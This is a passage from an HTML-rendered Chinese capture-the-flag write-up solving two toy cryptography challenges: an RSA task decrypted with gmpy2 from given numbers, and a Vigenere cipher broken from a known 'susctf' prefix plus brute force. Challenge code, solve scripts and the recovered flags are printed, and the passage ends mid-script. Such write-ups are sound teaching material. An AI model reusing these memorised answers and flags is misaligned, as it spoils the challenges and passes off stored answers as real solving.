number\">31531</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">95431874379056800461403445259355958387935856539457670356425515125991917830328568828651972541785162951577004360304248342910123051926823651602627402589646024807536428315338522607471890339989927938359121629376992700732961416640785761545967337504840306704525353304962963873393034684793837634498279771086870629657</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">9348930722233673602747870627922536632051931596830523021029470658344207945872450281637991502010865592065129583919444366705749206472328965457544194442473293260282452962070450562945560992589541332260234314736143038686897312913015783450737566433863829005429013314715550324440987242308148777081086560034599304327276652495664906244483122716702510872815412012108241078407548981547499209568327923277655224418476652760666165437469372395064298306123072763746852926480684491336990072974216874092110132242942354893729766833447395903884939906128031153138078686954738158738122774175286616882470456680443125446990462174128736465953</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>q <span class=\"token operator\">=</span> n <span class=\"token operator\">//</span> p</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">2246036184444567567139073961602298811002867470924696340632417536051794476792542719198116728236389022205886961611385905721428355981777782491582241568750536095813788750549170634252878325493396177232015086791252718288335539964125540101137052418937458875590436560115053061583109071488227920631582248047316093668301944870541017960236149831753450428112948744535859225066815666438374524191008471870502946582680908206282283571535153495358730331708125759496753890033345593289838781343364514965520605445715679520747672054689364311522070297101994310182740630464848831706608828051625089849355043315933834771158390525688604165661</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>n = 9348930722233673602747870627922536632051931596830523021029470658344207945872450281637991502010865592065129583919444366705749206472328965457544194442473293260282452962070450562945560992589541332260234314736143038686897312913015783450737566433863829005429013314715550324440987242308148777081086560034599304327276652495664906244483122716702510872815412012108241078407548981547499209568327923277655224418476652760666165437469372395064298306123072763746852926480684491336990072974216874092110132242942354893729766833447395903884939906128031153138078686954738158738122774175286616882470456680443125446990462174128736465953</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>c = 2246036184444567567139073961602298811002867470924696340632417536051794476792542719198116728236389022205886961611385905721428355981777782491582241568750536095813788750549170634252878325493396177232015086791252718288335539964125540101137052418937458875590436560115053061583109071488227920631582248047316093668301944870541017960236149831753450428112948744535859225066815666438374524191008471870502946582680908206282283571535153495358730331708125759496753890033345593289838781343364514965520605445715679520747672054689364311522070297101994310182740630464848831706608828051625089849355043315933834771158390525688604165661</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>'''</pre></td></tr></table></figure><p>运行后得到 flag：</p>\n<p><img data-src=\"image-20231016083300152.png\" alt=\"image-20231016083300152\"></p>\n<p><code>susctf&#123;d25d84fb-ca13-4dba-9e90-4994f30bef7a&#125;</code></p>\n<h3 id=\"vigenere\"><a class=\"markdownIt-Anchor\" href=\"#vigenere\">#</a> Vigenere</h3>\n<p>题目如下所示：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag<span class=\"token punctuation\">,</span> key</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">assert</span> re<span class=\"token punctuation\">.</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">r\"^susctf\\&#123;[0-9a-f]&#123;8&#125;-([0-9a-f]&#123;4&#125;-)&#123;3&#125;[0-9a-f]&#123;12&#125;\\&#125;$\"</span><span class=\"token punctuation\">,</span> flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">assert</span> re<span class=\"token punctuation\">.</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">(</span><span class=\"token string\">r\"^[a-z]&#123;10&#125;$\"</span><span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    key<span class=\"token punctuation\">,</span> msg <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    res <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    k_i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> msg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>isalpha<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            res <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        c <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        k <span class=\"token operator\">=</span> key<span class=\"token punctuation\">[</span>k_i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        res <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">26</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        k_i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>encrypt<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>ieplnp&#123;bhtnr6m3-04bm-41w3-lg78-c040377ys146&#125;</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>'''</pre></td></tr></table></figure><p><img data-src=\"image-20231013112128576.png\" alt=\"image-20231013112128576\"></p>\n<p>由上述代码可以得到以下密文 res 和明文 msg 之间的关系：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mi>m</mi><mi>s</mi><mi>g</mi><mo>+</mo><mi>k</mi><mo>−</mo><mn>2</mn><mo>∗</mo><mi>a</mi><mo stretchy=\"false\">)</mo><mtext>  </mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext>  </mtext><mn>26</mn><mo>+</mo><mi>a</mi></mrow><annotation encoding=\"application/x-tex\">res = ( msg + k - 2*a) \\;mod\\; 26 + a\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">a</span></span></span></span></span></p>\n<p>那么就能推导出以下内容：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi>m</mi><mi>s</mi><mi>g</mi><mo>=</mo><mn>26</mn><mo>∗</mo><mi>n</mi><mo>+</mo><mo stretchy=\"false\">(</mo><mi>r</mi><mi>e</mi><mi>s</mi><mo>−</mo><mi>a</mi><mo stretchy=\"false\">)</mo><mo>−</mo><mi>k</mi><mo>+</mo><mn>2</mn><mo>∗</mo><mi>a</mi><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mo stretchy=\"false\">(</mo><mi>n</mi><mtext>为整数</mtext><mo stretchy=\"false\">)</mo><mspace linebreak=\"newline\"></mspace><mi>k</mi><mo>=</mo><mn>26</mn><mo>∗</mo><mi>n</mi><mo>+</mo><mo stretchy=\"false\">(</mo><mi>r</mi><mi>e</mi><mi>s</mi><mo>−</mo><mi>a</mi><mo stretchy=\"false\">)</mo><mo>−</mo><mi>m</mi><mi>s</mi><mi>g</mi><mo>+</mo><mn>2</mn><mo>∗</mo><mi>a</mi><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mtext>  </mtext><mo stretchy=\"false\">(</mo><mi>n</mi><mtext>为整数</mtext><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">msg = 26 * n + (res - a ) - k + 2*a \\;\\;\\;\\;\\; (n为整数) \\\\\nk = 26 * n + (res - a ) - msg + 2*a \\;\\;\\;\\;\\; (n为整数)\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">n</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord cjk_fallback\">整</span><span class=\"mord cjk_fallback\">数</span><span class=\"mclose\">)</span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.69444em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mord\">6</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.66666em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">s</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.7777700000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">g</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">2</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∗</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">a</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">n</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord cjk_fallback\">整</span><span class=\"mord cjk_fallback\">数</span><span class=\"mclose\">)</span></span></span></span></span></p>\n<p>在加密规则中可以知道，密钥 key 为 10 位均为小写字母，msg 在加密时所有字符都处理为小写。加密过程中，字符如果不是字母就直接将其放入密文中不进行任何处理；如果是字母就将其与密钥 key 对应的位数（超过 10 就 mod10）进行相加，并减去 2*a，再对 26 取余，再加 a。已知密文为： <code>ieplnp&#123;bhtnr6m3-04bm-41w3-lg78-c040377ys146&#125;</code> ，明文应该是  <code>susctf</code>  为开头的，于是根据上述等式，可以得知 k 的前六位为  <code>qkxjuk</code></p>\n<p>剩下的四位不用求出，直接根据明文的字符都在  <code>a~f</code>  中可以对 k 进行穷举。最终得到唯一的 flag</p>\n<p>代码如下所示：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> itertools</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># from secret import flag, key</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># assert re.match(r\"^susctf\\&#123;[0-9a-f]&#123;8&#125;-([0-9a-f]&#123;4&#125;-)&#123;3&#125;[0-9a-f]&#123;12&#125;\\&#125;$\", flag)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># assert re.match(r\"^[a-z]&#123;10&#125;$\", key)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    key<span class=\"token punctuation\">,</span> msg <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>lower<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    res <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    k_i <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> msg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>isalpha<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            res <span class=\"token operator\">+=</span> msg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        c <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        k <span class=\"token operator\">=</span> key<span class=\"token punctuation\">[</span>k_i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        res <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">26</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        k_i <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> res</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    k_i <span class=\"token operator\">=</span> <span class=\"token number\">6</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    msg <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> res<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>isalpha<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            msg <span class=\"token operator\">+=</span> res<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        m <span class=\"token operator\">=</span> res<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        k <span class=\"token operator\">=</span> key<span class=\"token punctuation\">[</span>k_i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">for</span> n <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            msg_ <span class=\"token operator\">=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token number\">26</span> <span class=\"token operator\">*</span> n <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>msg_<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token comment\"># if msg_.islower():</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                msg <span class=\"token operator\">+=</span> msg_</pre></td></tr><tr><td 